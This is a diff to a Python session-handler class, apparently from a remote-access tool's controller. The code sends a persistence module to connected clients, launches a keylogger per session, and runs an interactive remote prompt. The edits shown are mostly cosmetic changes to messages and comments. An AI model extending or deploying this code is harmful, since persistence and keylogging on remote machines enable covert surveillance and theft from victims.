@@ -97,7 +97,8 @@ class Session:
         #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
         mod_persi = "MOD_PERSISTENCE:default"
         if(CheckConn().sendsafe(self.session_nb, self.sock, mod_persi)): #send mod persi
-            #printColor("information","[+] the persistence mod was sent.\n")
+            #printColor("information","[+] the p
+            # persistence mod was sent.\n")
             
             reponse = CheckConn().recvsafe(self.sock,4096)
             if(reponse == "\r\n"):#Mod persi ok  
@@ -146,20 +147,23 @@ class Session:
         
         time.sleep(2) #Allows to wait for all connections to end (optional)
 
+
     def lonelyKeylogger(self):
-        print("????")
         keylogger = Keylogger(self.session_nb)
-        keylogger.directTcp()
+        keylogger.main()
+        
+        printColor("information","\n[?] You are in SESSION MOD.\n")
 
 
-    def printInformation(self):
+    def printInformation(self): #comming soon baby !
         pass
 
 
     def main(self): #Main function of the class | tpl = tuple session_nb = session number
         
-        printColor("help","\n[?] Run -h or --help to list the available commands.\n")
-        checker = True                                     #and checker why and ?
+        printColor("help","\n[?] Run -b or --back to return to the MENU MOD.")
+        printColor("help","[?] Run -h or --help to list the available commands.\n")
+        checker = True                                   
         while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker: #If connexion is always connected (True) | The checker allows to break the loop when the -b or --back argument is executed without touching a NB_ALIVE 
             terminal = str(input(str(self.ip_client)+">")).split()
             for i in range(0,len(terminal)):   
